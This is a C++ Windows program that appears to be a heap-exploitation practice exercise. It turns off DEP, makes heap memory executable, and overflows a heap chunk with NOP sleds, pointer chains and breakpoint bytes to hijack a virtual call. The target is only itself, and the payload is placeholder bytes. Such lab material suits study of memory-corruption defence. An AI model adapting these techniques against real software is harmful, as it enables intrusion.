#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <Winbase.h>
#include <memoryapi.h>

using namespace std;

#define CHUNK_SIZE 0x190
#define ALLOC_COUNT 10

class SomeObject {
public:
	void function1(){
	};
 
	virtual void virtualFunction(){
		printf("test\n");
	};
};

int main(int args, char ** argv){
	SetProcessDEPPolicy(0x00000002);
	int i;
	HANDLE hChunk;
	void * allocations[ALLOC_COUNT];
	SomeObject * objects[5];
	SomeObject * obj = new SomeObject();
	printf("SomeObject address : 0x%08p\n", obj);
	int vectorSize = 40;

	HANDLE defaultHeap = GetProcessHeap();

	for(i = 0; i < ALLOC_COUNT; i++){
	hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
	memset(hChunk, 'A', 0x190);

	allocations[i] = hChunk;

	printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
	}
	DWORD protectlength = 0x00000020;
	PDWORD heapstart = (DWORD *) allocations[0];
	PDWORD heapend = (DWORD *) allocations[2] + protectlength;
	VirtualProtect(heapstart, 0x1000, 0x40, heapend);
	HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);

	vector<SomeObject*> v1(vectorSize, obj);
	vector<SomeObject*> v2(vectorSize, obj);
	vector<SomeObject*> v3(vectorSize, obj);
	vector<SomeObject*> v4(vectorSize, obj);
	vector<SomeObject*> v5(vectorSize, obj);
	vector<SomeObject*> v6(vectorSize, obj);
	vector<SomeObject*> v7(vectorSize, obj);
	vector<SomeObject*> v8(vectorSize, obj);
	vector<SomeObject*> v9(vectorSize, obj); 
	vector<SomeObject*> v10(vectorSize, obj);

	printf("vector : 0x%08p\n", (void*) &v1);
	printf("vector : 0x%08p\n", (void*) &v2);
	printf("vector : 0x%08p\n", (void*) &v3);
	printf("vector : 0x%08p\n", (void*) &v4);
	printf("vector : 0x%08p\n", (void*) &v5);
	printf("vector : 0x%08p\n", (void*) &v6);
	printf("vector : 0x%08p\n", (void*) &v7);
	printf("vector : 0x%08p\n", (void*) &v8);
	printf("vector : 0x%08p\n", (void*) &v9);
	printf("vector : 0x%08p\n", (void*) &v10);
	memset(allocations[2], 'A', 0x190);
	char * heapret = (char *) allocations[2];
	char heapret_chararray[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray = (uint32_t) heapret;
	char return_address_1[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	char return_address_2[] = "\xCC\xCC\xCC\xCC";
	char return_address_3[] = "\xDD\xDD\xDD\xDD";
	char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	char * heapret_2 = (char *) allocations[2] + 4;
	char heapret_chararray_2[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray_2 = (uint32_t) heapret_2;
	char * heapret_3 = (char *) allocations[2] + 8;
	char heapret_chararray_3[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray_3 = (uint32_t) heapret_3;
	char * heapret_4 = (char *) allocations[2] + 16;
	char heapret_chararray_4[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray_4 = (uint32_t) heapret_4;
	char * ret_1 = heapret_chararray;
	char * ret_2 = heapret_chararray_2;
	char * ret_3 = heapret_chararray_3;
	char * ret_4 = heapret_chararray_4;

	// EAX OFFSET = 24
	// EDX offset = 28
	memmove((char *) allocations[2], ret_2, 0x4);
	memmove((char *) allocations[2] + 4, ret_3, 0x4);
	memmove((char *) allocations[2] + 8, ret_4, 0x4);
	memset((char *) allocations[2] + 16, '\xCC', 0x180);
	memmove((char *) allocations[2] + 400, return_address_1, 0x18);
	//memmove((char *) allocations[2] + 424, payload, 0x18);
	memmove((char *) allocations[2] + 424, (char *) allocations[2], 0x4);
	memmove((char *) allocations[2] + 428, (char *) allocations[2], 0x4);
	memset((char *) allocations[2] + 432, 'A', 0x1000);
	//memset(allocations[2], 'B', CHUNK_SIZE + 8 + 32);
	v1.at(0)->virtualFunction();
	system("PAUSE");

	return 0;
}